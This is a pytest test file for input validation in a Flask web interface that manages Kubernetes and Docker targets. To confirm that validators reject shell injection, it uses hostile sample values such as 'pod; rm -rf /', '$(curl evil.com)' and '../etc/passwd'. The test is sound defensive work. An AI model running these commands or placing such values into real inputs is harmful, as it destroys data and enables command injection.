"""
tests/test_web_validation.py — safety-net tests for Flask route input validation.

Covers:
  - /api/resource  kind/name/ns validation (injection prevention)
  - /api/tab       lines param sanitisation (shell injection fix)
  - /api/targets   POST name/type validation
  - _web_classify  triage classification logic
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import re
import pytest
from unittest.mock import patch, MagicMock

# ── import validation helpers directly (no Flask needed) ─────────────────────

from ui.web import _SAFE_KINDS, _SAFE_NAME_RE


# ── _SAFE_NAME_RE regex tests ─────────────────────────────────────────────────

class TestSafeNameRegex:
    """The name/namespace regex must reject anything that could be injected."""

    def test_valid_simple(self):
        assert _SAFE_NAME_RE.match("nginx")

    def test_valid_with_hyphen(self):
        assert _SAFE_NAME_RE.match("my-pod-abc123")

    def test_valid_with_dot(self):
        assert _SAFE_NAME_RE.match("nginx.default")

    def test_valid_with_numbers(self):
        assert _SAFE_NAME_RE.match("pod123")

    def test_rejects_empty(self):
        assert not _SAFE_NAME_RE.match("")

    def test_rejects_starts_with_hyphen(self):
        assert not _SAFE_NAME_RE.match("-bad")

    def test_rejects_semicolon(self):
        assert not _SAFE_NAME_RE.match("pod; rm -rf /")

    def test_rejects_ampersand(self):
        assert not _SAFE_NAME_RE.match("pod && curl evil.com")

    def test_rejects_backtick(self):
        assert not _SAFE_NAME_RE.match("pod`whoami`")

    def test_rejects_dollar(self):
        assert not _SAFE_NAME_RE.match("pod$(id)")

    def test_rejects_pipe(self):
        assert not _SAFE_NAME_RE.match("pod|ls")

    def test_rejects_space(self):
        assert not _SAFE_NAME_RE.match("pod name")

    def test_rejects_slash(self):
        assert not _SAFE_NAME_RE.match("../etc/passwd")

    def test_rejects_newline(self):
        assert not _SAFE_NAME_RE.match("pod\nrm -rf /")


# ── _SAFE_KINDS set tests ──────────────────────────────────────────────────────

class TestSafeKinds:
    def test_pod_allowed(self):
        assert "pod" in _SAFE_KINDS

    def test_node_allowed(self):
        assert "node" in _SAFE_KINDS

    def test_deployment_allowed(self):
        assert "deployment" in _SAFE_KINDS

    def test_secret_blocked(self):
        # secrets contain sensitive data — must not be fetchable
        assert "secret" not in _SAFE_KINDS

    def test_serviceaccount_blocked(self):
        assert "serviceaccount" not in _SAFE_KINDS

    def test_clusterrolebinding_blocked(self):
        assert "clusterrolebinding" not in _SAFE_KINDS

    def test_arbitrary_kind_blocked(self):
        assert "../../etc/passwd" not in _SAFE_KINDS
        assert "exec" not in _SAFE_KINDS


# ── lines param sanitisation ──────────────────────────────────────────────────

class TestLinesParamSanitisation:
    """Verify the int() cast + clamp logic we added to api_tab."""

    @staticmethod
    def _sanitise(raw):
        """Mirror the sanitisation logic from ui/web.py api_tab."""
        try:
            return max(1, min(int(raw), 5000))
        except (ValueError, TypeError):
            return 100

    def test_normal_integer(self):
        assert self._sanitise("100") == 100

    def test_string_with_semicolon_injection(self):
        # Before the fix this would reach the shell as "100; rm -rf /"
        result = self._sanitise("100; rm -rf /")
        assert result == 100  # falls back to default

    def test_subshell_injection(self):
        result = self._sanitise("$(curl evil.com)")
        assert result == 100

    def test_backtick_injection(self):
        result = self._sanitise("`id`")
        assert result == 100

    def test_empty_string_falls_back(self):
        assert self._sanitise("") == 100

    def test_none_falls_back(self):
        assert self._sanitise(None) == 100

    def test_zero_clamped_to_one(self):
        assert self._sanitise("0") == 1

    def test_negative_clamped_to_one(self):
        assert self._sanitise("-50") == 1

    def test_above_max_clamped(self):
        assert self._sanitise("999999") == 5000

    def test_exactly_max(self):
        assert self._sanitise("5000") == 5000


# ── Flask route integration tests (using test client) ────────────────────────

@pytest.fixture
def client():
    """Create a Flask test client with mocked singletons."""
    with patch("ui.web._targets") as mock_targets, \
         patch("ui.web._tools") as mock_tools, \
         patch("ui.web._auto_register_localhost"):

        mock_targets.get.return_value = None   # default: target not found
        mock_targets.load_safe.return_value = []

        from ui.web import app
        app.config["TESTING"] = True
        with app.test_client() as c:
            yield c, mock_targets, mock_tools


class TestApiResourceValidation:
    def test_unknown_target_returns_404(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = None
        r = c.get("/api/v1/resource/t1?kind=pod&name=nginx&ns=default")
        assert r.status_code == 404

    def test_invalid_kind_rejected(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        r = c.get("/api/v1/resource/t1?kind=secret&name=nginx&ns=default")
        assert r.status_code == 400
        assert b"invalid kind" in r.data

    def test_injected_kind_rejected(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        r = c.get("/api/v1/resource/t1?kind=pod%3Brm&name=nginx&ns=default")
        assert r.status_code == 400

    def test_empty_name_rejected(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        r = c.get("/api/v1/resource/t1?kind=pod&name=&ns=default")
        assert r.status_code == 400
        assert b"invalid name" in r.data

    def test_injected_name_rejected(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        r = c.get("/api/v1/resource/t1?kind=pod&name=nginx%3Brm+-rf+%2F&ns=default")
        assert r.status_code == 400

    def test_injected_namespace_rejected(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        r = c.get("/api/v1/resource/t1?kind=pod&name=nginx&ns=default%26%26id")
        assert r.status_code == 400

    def test_valid_request_calls_tools(self, client):
        c, mock_targets, mock_tools = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        mock_tools.execute.return_value = "NAME  STATUS\nnginx  Running"
        r = c.get("/api/v1/resource/t1?kind=pod&name=nginx&ns=default")
        assert r.status_code == 200

    def test_pod_response_includes_yaml_key(self, client):
        c, mock_targets, mock_tools = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        mock_tools.execute.return_value = "apiVersion: v1\nkind: Pod\n"
        r = c.get("/api/v1/resource/t1?kind=pod&name=nginx&ns=default")
        assert r.status_code == 200
        body = r.get_json()
        # modal's YAML tab depends on this contract; tripwire covers regressions.
        assert "yaml" in body
        assert {"describe", "logs", "previous", "yaml"}.issubset(body.keys())
        invoked = [args[0][1] for args in mock_tools.execute.call_args_list]
        assert any("kubectl get pod nginx -n default -o yaml" in cmd for cmd in invoked)


class TestApiTargetsValidation:
    def test_add_without_name_returns_400(self, client):
        c, mock_targets, _ = client
        r = c.post("/api/v1/targets",
                   json={"type": "kubernetes", "config": {}},
                   content_type="application/json")
        assert r.status_code == 400
        assert b"name" in r.data

    def test_add_with_invalid_type_returns_400(self, client):
        c, mock_targets, _ = client
        r = c.post("/api/v1/targets",
                   json={"name": "prod", "type": "notreal", "config": {}},
                   content_type="application/json")
        assert r.status_code == 400
        assert b"invalid type" in r.data

    def test_add_without_content_type_does_not_crash(self, client):
        c, mock_targets, _ = client
        # No Content-Type — request.json will be None, should return 400 not 500
        r = c.post("/api/v1/targets", data=b"garbage")
        assert r.status_code in (400, 415)  # bad request or unsupported media type

    def test_chat_stream_without_content_type_does_not_crash(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        r = c.post("/api/v1/chat/t1/stream", data=b"garbage")
        assert r.status_code in (400, 415)


# ── Docker test command (M-02) ────────────────────────────────────────────────

class TestDockerTestCommand:
    """Regression: the Go template must be quoted so shells can't reinterpret
    the braces. Unquoted {{.ServerVersion}} broke Docker target health checks
    under PowerShell (scriptblock syntax) and certain Windows shells."""

    def test_docker_format_is_single_quoted(self):
        from ui.web import _TEST_COMMANDS
        cmd = _TEST_COMMANDS["docker"]
        assert "'{{.ServerVersion}}'" in cmd, (
            f"Docker test command must single-quote the Go template, got: {cmd}"
        )

    def test_docker_format_not_bare(self):
        from ui.web import _TEST_COMMANDS
        cmd = _TEST_COMMANDS["docker"]
        # The bare, unquoted form must not reappear.
        assert " {{.ServerVersion}} " not in cmd
        assert "--format {{" not in cmd


# ── Per-message length cap (H-02) ─────────────────────────────────────────────

class TestMessageLengthCap:
    """Prompts/messages over _MAX_MESSAGE_CHARS must return 400, not reach LLM.

    The 1 MB MAX_CONTENT_LENGTH body cap is a separate, coarser gate. This
    covers the finer per-message cap that bounds LLM token spend.
    """

    def test_chat_stream_rejects_oversize_message(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        from ui.web import _MAX_MESSAGE_CHARS
        big = "a" * (_MAX_MESSAGE_CHARS + 1)
        r = c.post("/api/v1/chat/t1/stream",
                   json={"message": big},
                   content_type="application/json")
        assert r.status_code == 400
        assert b"too long" in r.data

    def test_chat_stream_accepts_boundary_message(self, client):
        c, mock_targets, _ = client
        mock_targets.get.return_value = {"type": "kubernetes", "config": {}}
        from ui.web import _MAX_MESSAGE_CHARS
        at_cap = "a" * _MAX_MESSAGE_CHARS
        # Don't stream to completion — just verify the cap doesn't reject at
        # exactly the limit. Status should NOT be 400 for length.
        r = c.post("/api/v1/chat/t1/stream",
                   json={"message": at_cap},
                   content_type="application/json")
        assert r.status_code != 400 or b"too long" not in r.data

    def test_analyze_rejects_oversize_prompt(self, client):
        c, *_ = client
        from ui.web import _MAX_MESSAGE_CHARS
        big = "x" * (_MAX_MESSAGE_CHARS + 1)
        r = c.post("/api/v1/analyze",
                   json={"prompt": big},
                   content_type="application/json")
        assert r.status_code == 400
        assert b"too long" in r.data

    def test_analyze_stream_rejects_oversize_prompt(self, client):
        c, *_ = client
        from ui.web import _MAX_MESSAGE_CHARS
        big = "x" * (_MAX_MESSAGE_CHARS + 1)
        r = c.post("/api/v1/analyze/stream",
                   json={"prompt": big},
                   content_type="application/json")
        assert r.status_code == 400
        assert b"too long" in r.data

    def test_body_over_1mb_rejected_by_flask(self, client):
        c, *_ = client
        # MAX_CONTENT_LENGTH=1MB — Flask should 413 before our route runs.
        payload = '{"prompt":"' + ("y" * (2 * 1024 * 1024)) + '"}'
        r = c.post("/api/v1/analyze",
                   data=payload,
                   content_type="application/json")
        assert r.status_code == 413


# ── _web_classify triage logic ────────────────────────────────────────────────

class TestWebClassify:
    def setup_method(self):
        from ui.web import _web_classify
        self._classify = _web_classify

    def test_node_not_ready_is_sev1(self):
        assert self._classify({"reason": "NodeNotReady"}) == "SEV1"

    def test_memory_pressure_is_sev1(self):
        assert self._classify({"reason": "MemoryPressure"}) == "SEV1"

    def test_crash_loop_is_sev2(self):
        assert self._classify({"reason": "BackOff"}) == "SEV2"

    def test_oom_killed_is_sev2(self):
        assert self._classify({"reason": "OOMKilled"}) == "SEV2"

    def test_unhealthy_is_sev2(self):
        assert self._classify({"reason": "Unhealthy"}) == "SEV2"

    def test_unknown_is_sev3(self):
        assert self._classify({"reason": "SomethingUnknown"}) == "SEV3"

    def test_empty_reason_is_sev3(self):
        assert self._classify({}) == "SEV3"

    def test_normal_event_would_be_filtered_before_classify(self):
        # Normal events are filtered in _web_triage_handle before classify is called
        # SEV3 is the fallback for any unrecognised warning reason
        assert self._classify({"reason": "Pulled"}) == "SEV3"
